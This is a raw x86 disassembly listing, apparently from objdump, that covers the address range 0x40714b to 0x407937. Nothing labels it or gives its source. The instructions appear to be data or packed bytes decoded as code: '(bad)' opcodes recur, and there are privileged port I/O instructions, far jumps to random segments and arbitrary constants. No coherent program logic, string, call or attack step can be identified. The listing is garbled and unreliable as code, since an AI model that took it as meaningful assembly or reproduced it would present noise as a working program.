  40714b:	repz icebp 
  40714d:	fild   WORD PTR [edx-0x5a]
  407150:	mov    eax,DWORD PTR [ebp+0x1]
  407153:	punpckhdq mm4,QWORD PTR [ebp+0x14d58d49]
  40715a:	aaa    
  40715b:	stos   DWORD PTR es:[edi],eax
  40715c:	fs cwde 
  40715e:	dec    ebx
  40715f:	xlat   BYTE PTR ds:[ebx]
  407160:	mov    cl,0x27
  407162:	ja     0x407135
  407164:	out    dx,al
  407165:	jge    0x407122
  407167:	push   eax
  407168:	push   ebx
  407169:	scas   eax,DWORD PTR es:[edi]
  40716a:	push   ss
  40716b:	sahf   
  40716c:	jp     0x40717f
  40716e:	imul   edi,DWORD PTR [esi-0x31f79856],0xc0406086
  407178:	ds xor eax,0x8d435e0
  40717e:	jle    0x4071a1
  407180:	std    
  407181:	sbb    eax,0x1f58573d
  407186:	mov    ebp,DWORD PTR [eax]
  407188:	rcr    bh,1
  40718a:	fs mov eax,0x6b26b1c1
  407190:	mov    ecx,0x82e5dc66
  407195:	cmp    BYTE PTR [ebx],bl
  407197:	fld    TBYTE PTR [edi]
  407199:	clc    
  40719a:	dec    edx
  40719b:	lock loopne 0x407203
  40719e:	inc    ecx
  40719f:	(bad)  
  4071a0:	and    ah,bh
  4071a2:	shr    BYTE PTR ds:0x5ba5bd8a,cl
  4071a8:	imul   esp,DWORD PTR [eax],0xe1ee63a2
  4071ae:	push   esp
  4071af:	or     ah,cl
  4071b1:	sub    bl,BYTE PTR [eax-0x18]
  4071b4:	pop    ecx
  4071b5:	jg     0x4071a5
  4071b7:	mov    ds:0x4cb10062,eax
  4071bc:	rcl    BYTE PTR [esi-0x57],cl
  4071bf:	push   esi
  4071c0:	push   esi
  4071c1:	lods   al,BYTE PTR ds:[esi]
  4071c2:	jl     0x4071f6
  4071c4:	lods   al,BYTE PTR ds:[esi]
  4071c5:	jg     0x4071e6
  4071c7:	test   BYTE PTR [ebp-0x67784f20],0xfe
  4071ce:	int3   
  4071cf:	int    0xde
  4071d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071d2:	lods   eax,DWORD PTR ds:[esi]
  4071d3:	cmp    al,0x42
  4071d5:	repnz dec eax
  4071d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071d8:	cs push 0xfffffff0
  4071db:	and    BYTE PTR [edx-0x6dba3651],ah
  4071e1:	adc    eax,0x24bde1f0
  4071e6:	fistp  WORD PTR [ecx+ecx*8]
  4071e9:	aas    
  4071ea:	jmp    0x99b2e0f3
  4071ef:	jne    0x407212
  4071f1:	cdq    
  4071f2:	ins    DWORD PTR es:[edi],dx
  4071f3:	scas   eax,DWORD PTR es:[edi]
  4071f4:	inc    eax
  4071f5:	jle    0x407236
  4071f7:	add    BYTE PTR [edx+0x37c20cb8],al
  4071fd:	ja     0x4071b9
  4071ff:	mov    edi,0xb2a70245
  407204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407205:	(bad)  
  407206:	test   al,ch
  407208:	test   al,0x62
  40720a:	sbb    eax,0x750fd53d
  40720f:	(bad)  
  407210:	sbb    DWORD PTR [ebx+0x62],ebp
  407213:	lods   eax,DWORD PTR ds:[esi]
  407214:	outs   dx,DWORD PTR ds:[esi]
  407215:	loope  0x40726d
  407217:	push   cs
  407218:	pop    DWORD PTR ds:0x8946c7aa
  40721e:	push   ds
  40721f:	jg     0x407220
  407221:	lahf   
  407222:	mov    bl,0x60
  407224:	std    
  407225:	loope  0x407235
  407227:	inc    esp
  407228:	add    eax,0xd7108e9
  40722d:	mov    edx,0xb4769d9b
  407232:	mov    ch,BYTE PTR [esp+edx*1+0x4e]
  407236:	sbb    al,0x33
  407238:	push   0x7e26f89f
  40723d:	pushf  
  40723e:	sar    BYTE PTR [esi-0x36781e67],0x33
  407245:	je     0x40723f
  407247:	jge    0x4071d3
  407249:	sub    esi,DWORD PTR [ebx+esi*2-0xd7c0158]
  407250:	sub    al,dl
  407252:	push   esp
  407253:	addr16 popa 
  407255:	sub    eax,DWORD PTR [ecx]
  407257:	loopne 0x4072b6
  407259:	aaa    
  40725a:	(bad)  
  40725b:	fmul   DWORD PTR ds:0xe5ae1022
  407261:	outs   dx,BYTE PTR ds:[esi]
  407262:	aaa    
  407263:	stos   DWORD PTR es:[edi],eax
  407264:	mov    esp,0x22e35fd5
  407269:	dec    edi
  40726a:	loop   0x4071ed
  40726c:	push   esi
  40726d:	mov    bh,0x62
  40726f:	fdiv   QWORD PTR [eax-0x53]
  407272:	jne    0x407230
  407274:	cli    
  407275:	sub    DWORD PTR [edx-0x4f7c785],0xd
  40727c:	mov    eax,ds:0xf5a3ec75
  407281:	cmp    al,0x49
  407283:	sahf   
  407284:	ror    BYTE PTR [edx],cl
  407286:	or     edx,ebx
  407288:	leave  
  407289:	fneni(8087 only) 
  40728b:	push   ebx
  40728c:	inc    ebp
  40728d:	scas   eax,DWORD PTR es:[edi]
  40728e:	jns    0x4072a3
  407290:	(bad)
  407293:	xor    DWORD PTR [eax-0x5d82d4a5],0xafa679
  40729d:	xchg   edx,eax
  40729e:	xor    ah,BYTE PTR [ecx+0x73]
  4072a1:	and    ch,al
  4072a3:	jbe    0x4072de
  4072a5:	jne    0x407270
  4072a7:	not    BYTE PTR [ecx+0xa]
  4072aa:	jns    0x40726c
  4072ac:	xlat   BYTE PTR ds:[ebx]
  4072ad:	xchg   esi,eax
  4072ae:	mov    ebx,0x3bc2cd9f
  4072b3:	ins    BYTE PTR es:[edi],dx
  4072b4:	int3   
  4072b5:	adc    eax,0x59c921a
  4072ba:	retf   
  4072bb:	and    BYTE PTR [ecx+0x7610c97],dh
  4072c1:	pop    ebp
  4072c2:	ret    
  4072c3:	xchg   edi,eax
  4072c4:	test   BYTE PTR [ebp-0x18],ch
  4072c7:	fldenv [eax]
  4072c9:	jl     0x4072e0
  4072cb:	loop   0x407332
  4072cd:	add    ah,bh
  4072cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072d0:	or     DWORD PTR [ecx-0x1cd9bbb6],ebx
  4072d6:	std    
  4072d7:	ret    
  4072d8:	xchg   ebp,eax
  4072d9:	loopne 0x4072e2
  4072db:	neg    DWORD PTR [edi-0x3a0c0e94]
  4072e1:	xor    esi,DWORD PTR [edx-0x1112e9a8]
  4072e7:	rcr    bl,0x57
  4072ea:	jb     0x4072c9
  4072ec:	fs push edi
  4072ee:	sub    ebx,edx
  4072f0:	pop    esi
  4072f1:	out    0xa4,al
  4072f3:	call   0xb233:0x54e72af2
  4072fa:	out    dx,eax
  4072fb:	rcr    DWORD PTR [ebp+0x7be06572],0xb8
  407302:	mov    cl,0xdb
  407304:	jmp    0x40735f
  407306:	add    eax,eax
  407308:	test   al,0xa4
  40730a:	mov    ah,0x8b
  40730c:	into   
  40730d:	adc    al,0x1d
  40730f:	mov    ebp,0x8fb051ac
  407314:	add    al,0xb5
  407316:	cs xchg esi,eax
  407318:	adc    ecx,ebp
  40731a:	ss mov ah,0xc8
  40731d:	xor    BYTE PTR [eax+ecx*8-0x61],ah
  407321:	xlat   BYTE PTR ds:[ebx]
  407322:	or     BYTE PTR [edi],0xe0
  407325:	xor    DWORD PTR [edx+0x4],edx
  407328:	fwait
  407329:	dec    DWORD PTR [ebx]
  40732b:	sahf   
  40732c:	or     edi,edx
  40732e:	cld    
  40732f:	jb     0x4072e4
  407331:	xchg   edi,eax
  407332:	int    0x40
  407334:	pop    es
  407335:	out    dx,eax
  407336:	mov    cl,cl
  407338:	int    0x27
  40733a:	dec    edi
  40733b:	test   DWORD PTR [esi+ebx*8],0x2c6d5674
  407342:	cmp    BYTE PTR [ebx-0x22],bl
  407345:	and    eax,0x91749f36
  40734a:	dec    edx
  40734b:	add    bl,BYTE PTR [ecx+edx*4+0x35bb700d]
  407352:	mov    edi,0x9a88d68c
  407357:	pushaw 
  407359:	mov    cl,0x1a
  40735b:	pop    ecx
  40735c:	cdq    
  40735d:	jns    0x4073b7
  40735f:	rol    BYTE PTR [edi],1
  407361:	dec    edi
  407362:	dec    ebp
  407363:	out    dx,al
  407364:	shl    BYTE PTR [esi],cl
  407366:	ds (bad) 
  407368:	(bad)  
  407369:	not    BYTE PTR [ebx]
  40736b:	and    BYTE PTR [ecx],0x3e
  40736e:	int    0x5c
  407370:	enter  0x5afb,0x58
  407374:	jmp    0xf3cd:0x5d1aab1e
  40737b:	aad    0x6b
  40737d:	mov    dh,0x2c
  40737f:	fimul  WORD PTR [edx-0x5bb44ca4]
  407385:	xor    bh,BYTE PTR [edi+edx*8+0x268a4b20]
  40738c:	push   edx
  40738d:	imul   edx,DWORD PTR [eax+ecx*2-0x211a3fbf],0x601dd11d
  407398:	sub    BYTE PTR [ecx+eax*8],0x10
  40739c:	cmp    ah,BYTE PTR [eax]
  40739e:	je     0x407325
  4073a0:	or     DWORD PTR [eax+0x4],edi
  4073a3:	fild   DWORD PTR [edx]
  4073a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073a6:	dec    edx
  4073a7:	addr16 jge 0x4073eb
  4073aa:	cdq    
  4073ab:	mov    al,0xe6
  4073ad:	adc    al,BYTE PTR [esi+0x3ce79fa2]
  4073b3:	ins    BYTE PTR es:[edi],dx
  4073b4:	push   esp
  4073b5:	rol    BYTE PTR [edi+0x46],cl
  4073b8:	lahf   
  4073b9:	pop    ss
  4073ba:	push   esp
  4073bb:	ror    cl,cl
  4073bd:	push   esi
  4073be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073bf:	xor    eax,0xf6b92009
  4073c4:	fnstcw WORD PTR [eax+ecx*1+0x25c45731]
  4073cb:	or     al,ah
  4073cd:	mov    bh,bh
  4073cf:	dec    edi
  4073d0:	jp     0x40737d
  4073d2:	push   esi
  4073d3:	js     0x4073ea
  4073d5:	pop    ds
  4073d6:	mov    ecx,0xb046262b
  4073db:	mov    eax,0x55085ba3
  4073e0:	jmp    0xfd43594a
  4073e5:	jecxz  0x4073ac
  4073e7:	jns    0x40742e
  4073e9:	sbb    al,0x1b
  4073eb:	loop   0x40743d
  4073ed:	ret    
  4073ee:	and    dl,dh
  4073f0:	mov    DWORD PTR [esi+0x11113297],ebp
  4073f6:	dec    ebx
  4073f7:	sbb    DWORD PTR [ebx+edi*8+0x1264eb96],eax
  4073fe:	cli    
  4073ff:	fist   DWORD PTR [edx-0x6bbc1c6]
  407405:	fadd   QWORD PTR [ebx-0x78c37e94]
  40740b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40740c:	xchg   BYTE PTR [edx],dh
  40740e:	inc    ebp
  40740f:	adc    eax,0xe26f8072
  407414:	int3   
  407415:	fcom   QWORD PTR [eax-0x5e]
  407418:	je     0x407498
  40741a:	mov    ds:0x9520f01b,al
  40741f:	push   edi
  407420:	jbe    0x40749e
  407422:	or     DWORD PTR [ebx+0x6c136dd8],edx
  407428:	sbb    BYTE PTR [edx+eiz*2],bh
  40742b:	das    
  40742c:	pop    ecx
  40742d:	in     al,dx
  40742e:	sbb    BYTE PTR [ebp+0x1465400],dl
  407434:	pop    ss
  407435:	dec    ebx
  407436:	xchg   esi,eax
  407437:	iret   
  407438:	mov    cl,0xcf
  40743a:	int    0xa3
  40743c:	push   ecx
  40743d:	mov    ecx,0x203ae13
  407442:	inc    eax
  407443:	ret    
  407444:	or     eax,esi
  407446:	inc    esi
  407447:	jb     0x407423
  407449:	xor    dh,BYTE PTR [eax+0x1d]
  40744c:	sbb    al,0x44
  40744e:	jae    0x4073f9
  407450:	lods   eax,DWORD PTR ds:[esi]
  407451:	in     al,dx
  407452:	adc    BYTE PTR [ebp-0x67],dl
  407455:	test   DWORD PTR [esi-0x6e7bbdd1],ebx
  40745b:	cmp    eax,edx
  40745d:	jns    0x407488
  40745f:	inc    ebx
  407460:	mov    esp,DWORD PTR [esp+eiz*2]
  407463:	into   
  407464:	out    dx,al
  407465:	pop    ds
  407466:	imul   esi,DWORD PTR [ecx+0x0],0x8764b81e
  40746d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40746e:	(bad)  
  40746f:	cmc    
  407470:	clc    
  407471:	jmp    0x40742a
  407473:	cwde   
  407474:	add    dh,ch
  407476:	(bad)  
  407478:	dec    esi
  407479:	mov    ds:0x8916e68e,al
  40747e:	mov    al,0x55
  407480:	inc    edi
  407481:	adc    dh,cl
  407483:	clc    
  407484:	std    
  407485:	cmp    dl,dl
  407487:	scas   eax,DWORD PTR es:[edi]
  407488:	jle    0x40742e
  40748a:	or     eax,0xe840d5ba
  40748f:	push   0x7c
  407491:	call   DWORD PTR [edi+0x2d]
  407494:	sti    
  407495:	inc    esp
  407496:	xchg   ebp,eax
  407497:	or     BYTE PTR [ecx-0x581ade1f],dl
  40749d:	ret    0xdff0
  4074a0:	sbb    esi,DWORD PTR [edx+0x6364bdbc]
  4074a6:	es pop esi
  4074a8:	lock mov bh,0x6a
  4074ab:	lock sub ch,BYTE PTR [ebp+ebp*8+0x1d989396]
  4074b3:	fs push cs
  4074b5:	pop    esi
  4074b6:	nop
  4074b7:	sub    edi,DWORD PTR [edi-0x19]
  4074ba:	inc    edx
  4074bb:	ror    ebx,1
  4074bd:	pop    edi
  4074be:	and    eax,edi
  4074c0:	fwait
  4074c1:	sub    bh,BYTE PTR [edx+ebx*1]
  4074c4:	mov    ecx,ebp
  4074c6:	cmp    ch,ah
  4074c8:	cvttps2pi mm0,QWORD PTR [eax+ebp*4-0x20]
  4074cd:	jmp    0x57f6:0x612fe617
  4074d4:	add    eax,0xc5b9b309
  4074d9:	pop    esp
  4074da:	repz xchg esp,eax
  4074dc:	mov    ch,dh
  4074de:	jecxz  0x4074e9
  4074e0:	xchg   edi,eax
  4074e1:	sub    eax,0x2f9ccdf3
  4074e6:	dec    esi
  4074e7:	scas   eax,DWORD PTR es:[edi]
  4074e8:	mov    WORD PTR [esi-0x207d393],ds
  4074ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074ef:	test   al,0x29
  4074f1:	add    bh,BYTE PTR [ecx+0x62e5fb84]
  4074f7:	jo     0x407523
  4074f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074fa:	push   eax
  4074fb:	icebp  
  4074fc:	js     0x407501
  4074fe:	stos   BYTE PTR es:[edi],al
  4074ff:	or     ebp,DWORD PTR [ebx+0x3df01d86]
  407505:	test   DWORD PTR [ebx+0x43f5a2c2],edx
  40750b:	pop    eax
  40750c:	imul   ebx,eax,0xb22fa20a
  407512:	stos   BYTE PTR es:[edi],al
  407513:	jae    0x4074fa
  407515:	push   dx
  407517:	mov    eax,ds:0x99d12498
  40751c:	pop    eax
  40751d:	imul   edx,DWORD PTR [ecx-0x5b],0xffffff82
  407521:	mov    ecx,esp
  407523:	pop    ss
  407524:	pop    es
  407525:	rcr    esi,cl
  407527:	cmp    bh,cl
  407529:	cmp    esp,DWORD PTR [esi-0x44153c6a]
  40752f:	add    BYTE PTR [edi+0x6bf275ed],dh
  407535:	daa    
  407536:	xor    ecx,edi
  407538:	lods   al,BYTE PTR ds:[esi]
  407539:	shl    BYTE PTR [edi-0x5d],0xd3
  40753d:	and    DWORD PTR [ebx],0x67527b67
  407543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407544:	pushf  
  407545:	push   edi
  407546:	repnz scas eax,DWORD PTR es:[edi]
  407548:	mov    esi,0x3b531842
  40754d:	mov    cl,0x1f
  40754f:	icebp  
  407550:	addr16 push 0x2341f787
  407556:	repz xor eax,0x8cd55792
  40755c:	outs   dx,DWORD PTR ds:[esi]
  40755d:	fs sti 
  40755f:	aam    0x2f
  407561:	shl    BYTE PTR [edi+edi*1+0x7b2f7e8e],1
  407568:	(bad)  
  407569:	in     eax,dx
  40756a:	jnp    0x40751d
  40756c:	add    al,0xc6
  40756e:	mov    esp,0x3e8fa95b
  407573:	push   0xfffffff0
  407575:	leave  
  407576:	ds cmc 
  407578:	in     al,0x32
  40757a:	xor    ebp,DWORD PTR [ebp-0x3b]
  40757d:	addr16 mov ah,0xa
  407580:	sub    ebx,esi
  407582:	js     0x407510
  407584:	add    al,0xe0
  407586:	loope  0x407550
  407588:	in     eax,0xba
  40758a:	outs   dx,BYTE PTR ds:[esi]
  40758b:	mov    ds:0xc37c2e6c,eax
  407590:	(bad)  
  407592:	out    0x43,al
  407594:	push   edi
  407595:	adc    BYTE PTR [edi-0x7bb8da40],ah
  40759b:	pop    es
  40759c:	or     BYTE PTR [ecx+0x4c4f3f17],al
  4075a2:	mov    ebx,0x5759207d
  4075a7:	pop    ds
  4075a8:	inc    eax
  4075a9:	cmp    ch,BYTE PTR [eax+0x83a4112]
  4075af:	cld    
  4075b0:	jno    0x407552
  4075b2:	add    DWORD PTR [ecx-0x67],esi
  4075b5:	es push ds
  4075b7:	adc    BYTE PTR ds:0x9865c5e4,0x17
  4075be:	(bad)  
  4075bf:	fsubr  st(1),st
  4075c1:	mov    esp,0x2e00cf99
  4075c6:	xchg   DWORD PTR [ebp+0x5b],edx
  4075c9:	add    DWORD PTR [edx+ebx*8-0x65c6da0c],ebp
  4075d0:	mul    BYTE PTR [ecx+0x14]
  4075d3:	mov    eax,DWORD PTR [ecx-0x30]
  4075d6:	sub    bh,BYTE PTR [ebp+eiz*2-0x66]
  4075da:	test   cl,0x1b
  4075dd:	leave  
  4075de:	enter  0xd283,0x0
  4075e2:	mov    bh,0xae
  4075e4:	outs   dx,BYTE PTR ds:[esi]
  4075e5:	ins    DWORD PTR es:[edi],dx
  4075e6:	pop    ebp
  4075e7:	sar    DWORD PTR [ebp-0x1d],cl
  4075ea:	mov    ds:0xa59581,al
  4075ef:	mov    ah,0x69
  4075f1:	retf   0xa150
  4075f4:	mov    al,bl
  4075f6:	ja     0x40757d
  4075f8:	mov    ebx,0x796a63ea
  4075fd:	loope  0x407657
  4075ff:	pop    esi
  407600:	mov    ds:0x479d9642,al
  407605:	mov    ds:0x21802693,al
  40760a:	mov    cl,0x1d
  40760c:	out    0x47,eax
  40760e:	jg     0x4075f3
  407610:	call   0x23fe:0x9f7d8230
  407617:	adc    ebx,ebp
  407619:	cld    
  40761a:	dec    ebp
  40761b:	int3   
  40761c:	mov    cl,BYTE PTR [ecx+eiz*2+0x3b]
  407620:	std    
  407621:	or     edx,DWORD PTR [edx-0xb4d45d8]
  407627:	xchg   esp,eax
  407628:	cld    
  407629:	and    al,0xfc
  40762b:	mov    DWORD PTR [ecx+0x415e1cc6],ecx
  407631:	iret   
  407632:	or     BYTE PTR [eax-0x6e],0xf7
  407636:	out    dx,eax
  407637:	fimul  DWORD PTR [ebp+eiz*4+0x73]
  40763b:	push   ebx
  40763c:	cmp    ecx,DWORD PTR [ebx]
  40763e:	mov    cl,0x2f
  407640:	pop    esi
  407641:	pop    edx
  407642:	jne    0x4075ce
  407644:	cmp    eax,0xaf1acbce
  407649:	inc    esp
  40764a:	mov    edx,0x6dd13210
  40764f:	and    cl,BYTE PTR [eax]
  407651:	in     eax,0xe7
  407653:	jmp    0x32b3:0xe232884a
  40765a:	iret   
  40765b:	jae    0x40767c
  40765d:	stc    
  40765e:	xor    al,bl
  407660:	jmp    0x441a0cd
  407665:	mov    dh,0x95
  407667:	ss fnstsw ax
  40766a:	enter  0xbc7,0xe9
  40766e:	arpl   WORD PTR [edx+ecx*2-0x3d525393],di
  407675:	test   BYTE PTR [ebp-0x1850c2d3],cl
  40767b:	rcl    edi,1
  40767d:	or     al,0x56
  40767f:	adc    al,BYTE PTR [edx-0x5d]
  407682:	daa    
  407683:	cmp    ah,bh
  407685:	inc    esp
  407686:	out    0xc5,al
  407688:	mov    ecx,0xbeec3328
  40768d:	mov    eax,ds:0x6a419466
  407692:	ds or  eax,0xb7f7c50
  407698:	lahf   
  407699:	imul   edx,DWORD PTR [edi],0x5c
  40769c:	or     ebx,DWORD PTR [edx]
  40769e:	fnstsw WORD PTR [esi-0x49fb905b]
  4076a4:	jp     0x407633
  4076a6:	(bad)  
  4076a7:	pop    ebx
  4076a8:	clc    
  4076a9:	shr    DWORD PTR [ebx],0x6
  4076ac:	call   0x3c62:0x2e7f0e63
  4076b3:	lds    esi,FWORD PTR [edi]
  4076b5:	mov    ds:0x316611d0,al
  4076ba:	add    DWORD PTR [edi],esp
  4076bc:	popf   
  4076bd:	push   es
  4076be:	add    dl,BYTE PTR [eax]
  4076c0:	mov    eax,0x90186996
  4076c5:	jne    0x40770d
  4076c7:	stos   DWORD PTR es:[edi],eax
  4076c8:	xor    ebx,ebp
  4076ca:	push   0xa14c450
  4076cf:	xor    cl,BYTE PTR [esi+0x561d7aea]
  4076d5:	and    BYTE PTR [edx-0x38291908],bh
  4076db:	or     ecx,DWORD PTR [ecx-0x1a]
  4076de:	mov    ds:0xb3a6c224,eax
  4076e3:	xchg   esi,eax
  4076e4:	rcl    DWORD PTR [eax-0x2d],1
  4076e7:	sub    esi,ebp
  4076e9:	xchg   esp,eax
  4076ea:	adc    esi,ebx
  4076ec:	popa   
  4076ed:	cmp    dl,BYTE PTR [esi+0x28]
  4076f0:	jnp    0x407743
  4076f2:	into   
  4076f3:	in     eax,dx
  4076f4:	nop
  4076f5:	aad    0x96
  4076f7:	ret    
  4076f8:	sti    
  4076f9:	repz sub BYTE PTR [ebp-0x42],cl
  4076fd:	mov    edx,0x12a77c65
  407702:	or     BYTE PTR [edx-0x6d6bc839],al
  407708:	pushf  
  407709:	and    BYTE PTR [ecx+0x6a76dcdd],cl
  40770f:	sahf   
  407710:	test   eax,0x892d612c
  407715:	xchg   ebx,eax
  407716:	ins    DWORD PTR es:[edi],dx
  407717:	fnsave [edi]
  407719:	cwde   
  40771a:	jae    0x407718
  40771c:	and    BYTE PTR [esi],0xba
  40771f:	cmp    edi,ebx
  407721:	jmp    0x40775e
  407723:	pop    ss
  407724:	xor    ebx,DWORD PTR [esp+eax*2-0x4389ee85]
  40772b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40772c:	repnz push ss
  40772e:	mov    DWORD PTR [edx],eax
  407730:	mov    ah,0x4
  407732:	je     0x407749
  407734:	cwde   
  407735:	and    eax,0x59d71a5
  40773a:	sub    DWORD PTR [edx+0xb09db69],0x478c18d
  407744:	cdq    
  407745:	adc    eax,0x1b020e9
  40774a:	push   edi
  40774b:	sbb    ecx,DWORD PTR [ecx-0x419202e3]
  407751:	test   BYTE PTR [edx],al
  407753:	adc    eax,0x62925f7
  407758:	fnsave [ebp+0x26be64a1]
  40775e:	retf   
  40775f:	leave  
  407760:	inc    edi
  407761:	shl    ebp,0xd7
  407764:	sbb    edx,edi
  407766:	sub    edi,DWORD PTR [ebx+0x24]
  407769:	sbb    ebp,0x4beac461
  40776f:	cmp    cl,0xa8
  407772:	stc    
  407773:	push   ss
  407774:	cli    
  407775:	or     eax,DWORD PTR [ebx-0x12b4381a]
  40777b:	aam    0x62
  40777d:	and    DWORD PTR [edx],0x1fb6af83
  407783:	add    DWORD PTR [esp+ecx*8-0x6cda4f54],ebx
  40778a:	out    0xfc,al
  40778c:	out    0x1,eax
  40778e:	and    ecx,esp
  407790:	nop
  407791:	in     eax,0xc1
  407793:	das    
  407794:	(bad)  
  407795:	popf   
  407796:	jp     0x4077d1
  407798:	(bad)  
  407799:	mov    eax,esp
  40779b:	call   0x4e4b90d2
  4077a0:	fs jge 0x407739
  4077a3:	lods   al,BYTE PTR ds:[si]
  4077a5:	into   
  4077a6:	cli    
  4077a7:	sub    dl,BYTE PTR [edx]
  4077a9:	jmp    0x407789
  4077ab:	pop    edx
  4077ac:	stos   DWORD PTR es:[edi],eax
  4077ad:	imul   ecx,eax,0xffffffe6
  4077b0:	cli    
  4077b1:	push   es
  4077b2:	sbb    DWORD PTR [ebp+0x613a4d86],0xae129732
  4077bc:	xor    DWORD PTR [edx],ebx
  4077be:	popf   
  4077bf:	pusha  
  4077c0:	pop    ds
  4077c1:	loope  0x407805
  4077c3:	xchg   esi,eax
  4077c4:	aad    0xc7
  4077c6:	pop    es
  4077c7:	dec    DWORD PTR [esi+0x29]
  4077ca:	mov    BYTE PTR ss:[ebx-0x6e0d120e],ch
  4077d1:	cmp    eax,0xab38a285
  4077d6:	(bad)  
  4077d7:	adc    BYTE PTR [esi],dl
  4077d9:	push   edx
  4077da:	and    BYTE PTR [edx+0x6b923b27],ah
  4077e0:	lods   eax,DWORD PTR ds:[esi]
  4077e1:	test   BYTE PTR [esi],bh
  4077e3:	(bad)  
  4077e4:	rol    BYTE PTR [esi-0x76],0xd8
  4077e8:	sbb    DWORD PTR [esp+ebx*2+0x9],edi
  4077ec:	mov    eax,ds:0x2bf5d0e8
  4077f1:	(bad)  
  4077f2:	fwait
  4077f3:	push   edx
  4077f4:	jmp    0xb310:0xdc7071d4
  4077fb:	inc    ecx
  4077fc:	sbb    ecx,DWORD PTR [esp+edx*8]
  4077ff:	gs pop ss
  407801:	adc    al,ah
  407803:	xchg   edx,esp
  407805:	add    al,0x43
  407807:	and    edx,DWORD PTR [ebp+0x9]
  40780a:	xor    BYTE PTR [esi-0x37fc6035],dl
  407810:	fisubr DWORD PTR [ecx+0x6f]
  407813:	push   eax
  407814:	pusha  
  407815:	jae    0x407814
  407817:	xchg   edx,eax
  407818:	cmp    BYTE PTR [ebx+eax*1+0x73],0x7f
  40781d:	dec    esp
  40781e:	ins    BYTE PTR es:[edi],dx
  40781f:	aaa    
  407820:	sub    ch,cl
  407822:	inc    ebp
  407823:	inc    ebp
  407824:	inc    ecx
  407825:	cli    
  407826:	cmp    DWORD PTR [esi+0x44],eax
  407829:	cdq    
  40782a:	xchg   edx,eax
  40782b:	pop    ss
  40782c:	push   cs
  40782d:	xchg   ecx,eax
  40782e:	push   esp
  40782f:	push   cs
  407830:	sbb    DWORD PTR [ebp+0x26bb0211],eax
  407836:	pop    ebp
  407837:	sub    BYTE PTR [edi+0x6c6c9534],al
  40783d:	setge  BYTE PTR [ebx+0x1eae2b03]
  407844:	test   ah,al
  407846:	aas    
  407847:	jnp    0x4077dd
  407849:	add    cl,BYTE PTR [ebx+eiz*4-0x74]
  40784d:	cmp    cl,cl
  40784f:	cli    
  407850:	pop    esp
  407851:	mov    al,0xc8
  407853:	xchg   DWORD PTR [ecx],ebx
  407855:	jb     0x40783a
  407857:	pop    ss
  407858:	sar    BYTE PTR ds:0x5e29c0cd,1
  40785e:	add    ecx,DWORD PTR [esi+0x101dd5f]
  407864:	add    bh,0x91
  407867:	jne    0x407845
  407869:	add    eax,0x55990e06
  40786e:	cmp    eax,DWORD PTR ds:0x4ee4a462
  407874:	bound  eax,QWORD PTR [edx-0x14]
  407877:	mov    ecx,0x315c0db8
  40787c:	sub    al,0x6a
  40787e:	pop    ebp
  40787f:	(bad)  [ecx]
  407881:	ds mov ebp,0x9fb73cf4
  407887:	dec    esi
  407888:	mov    eax,ds:0x3cf0fd98
  40788d:	scas   al,BYTE PTR es:[edi]
  40788e:	jno    0x4078e2
  407890:	pop    ecx
  407891:	pusha  
  407892:	pop    edi
  407893:	jg     0x4078d7
  407895:	sub    ah,BYTE PTR [ecx+0x34]
  407898:	rcl    DWORD PTR [eax],1
  40789a:	push   cs
  40789b:	mov    bh,0xb3
  40789d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40789e:	mov    ebp,?
  4078a0:	mov    eax,0x8a7ad2e
  4078a5:	lock leave 
  4078a7:	or     al,0x97
  4078a9:	push   ds
  4078aa:	mov    ch,0xe0
  4078ac:	(bad)  
  4078ad:	hlt    
  4078ae:	stos   BYTE PTR es:[edi],al
  4078af:	jne    0x407846
  4078b1:	sbb    esi,DWORD PTR [ecx]
  4078b3:	ret    
  4078b4:	outs   dx,DWORD PTR ds:[esi]
  4078b5:	dec    ecx
  4078b6:	xchg   ecx,eax
  4078b7:	or     ah,BYTE PTR [ecx+0x6a79da65]
  4078bd:	in     al,0x43
  4078bf:	(bad)  
  4078c0:	or     BYTE PTR [eax+edx*4+0x46],ch
  4078c4:	popf   
  4078c5:	inc    edi
  4078c6:	test   BYTE PTR ss:[ebp+ebx*2+0x1fa605bd],dh
  4078ce:	imul   BYTE PTR [ebx+0x7c62e011]
  4078d4:	jecxz  0x40785d
  4078d6:	iret   
  4078d7:	fadd   DWORD PTR [esi+edx*1+0xf]
  4078db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078dc:	push   es
  4078dd:	outs   dx,BYTE PTR ds:[esi]
  4078de:	hlt    
  4078df:	ss mov ecx,0x3f053e5b
  4078e5:	ret    
  4078e6:	popf   
  4078e7:	push   cs
  4078e8:	bound  esi,QWORD PTR [ecx+0x12]
  4078eb:	fild   WORD PTR [eax-0x18]
  4078ee:	inc    cx
  4078f0:	mov    DWORD PTR [edx+eax*8],ebp
  4078f3:	adc    bl,BYTE PTR [edi]
  4078f5:	pushf  
  4078f6:	sbb    edi,0xcd0a7b83
  4078fc:	mov    al,ds:0x52b3b9c4
  407901:	bound  edi,QWORD PTR [ebp-0x2faa7a23]
  407907:	(bad)  
  407909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40790a:	scas   al,BYTE PTR es:[edi]
  40790b:	les    ebx,FWORD PTR [esi]
  40790d:	ficom  WORD PTR [ebx+0x2b223637]
  407913:	psrlq  mm5,QWORD PTR [ebx+ebp*2-0x35cb4d20]
  40791b:	clc    
  40791c:	(bad)  
  40791d:	push   edi
  40791e:	lock cld 
  407920:	adc    cl,0x23
  407923:	gs dec edi
  407925:	cmp    al,0x64
  407927:	sbb    ch,BYTE PTR [edx-0x3b751897]
  40792d:	cld    
  40792e:	mov    cl,BYTE PTR [edi-0x46b72b4c]
  407934:	and    bl,BYTE PTR [edi]
  407936:	xchg   edx,eax
  407937:	jmp    0x9586:0xdbbbae2d
